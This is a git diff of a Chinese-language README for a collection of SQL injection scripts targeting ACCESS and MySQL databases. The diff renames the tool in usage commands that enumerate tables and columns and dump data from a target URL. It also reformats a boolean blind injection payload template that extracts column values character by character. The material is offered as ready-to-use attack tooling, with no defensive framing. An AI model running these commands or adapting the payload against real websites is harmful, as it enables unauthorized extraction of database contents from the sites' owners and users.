@@ -10,11 +10,11 @@
 
 Blog ： http://47.95.206.199/?p=419
 ```bash
-python3 injection.py -u TargetUrl --tables --keyword=true_page_keyword [--thread=20] #爆表名,--thread参数可选，默认为10
+python3 inj.py -u Url --tables --keyword=true_page_keyword [--thread=20] #爆表名,--thread参数可选，默认为10
 
-python3 injection.py -u TargetUrl -T table_name --columns --keyword=true_page_keyword [--thread=20] #爆表名,--thread参数可选，默认为10
+python3 inj.py -u Url -T table_name --columns --keyword=true_page_keyword [--thread=20] #爆表名
 
-python3 injection.py -u TargetUrl -T table_name -C col_name1,col_name2... --dump --keyword=true_page_keyword [--thread=20] #爆数据
+python3 inj.py -u Url -T table_name -C col_name1,col_name2... --dump --keyword=keyword[--thread=20] #爆数据
 ```
 ## 2.2 MYSQL-Bind-injection
 
@@ -48,10 +48,12 @@ keyword ="keyword"
 3>爆列中数据的时候，列名请填写两个，在程序写死了，如果需要多个列名请修改第334行代码：
 
 e.g.三个列
+```python
+payload = "-1 or ascii(substr((select concat(%s,0x7c,%s,0x7c,%s) from %s limit %s,1),%s,1))=%s" \
+% (self.column[0],self.column[1],self.column[2],self.table, self.i, x, n)
+```
 
-payload = "-1 or ascii(substr((select concat(%s,0x7c,%s,0x7c,%s) from %s limit %s,1),%s,1))=%s" % (self.column[0],self.column[1],self.column[2],self.table, self.i, x, n)
-
-
+```html
 ###########
 ├── Readme.md               // 帮助文档 
 ├── ACCESS-Injection        // ACCESS的逐字猜解法脚本
@@ -60,3 +62,5 @@ payload = "-1 or ascii(substr((select concat(%s,0x7c,%s,0x7c,%s) from %s limit %
 │   ├── column.txt          //常用列名，来自sqlmap
 ├── MYSQL-Bind-injection    //mysql基于布尔盲注的脚本
 │   ├── injection.py        //主程序
+
+```
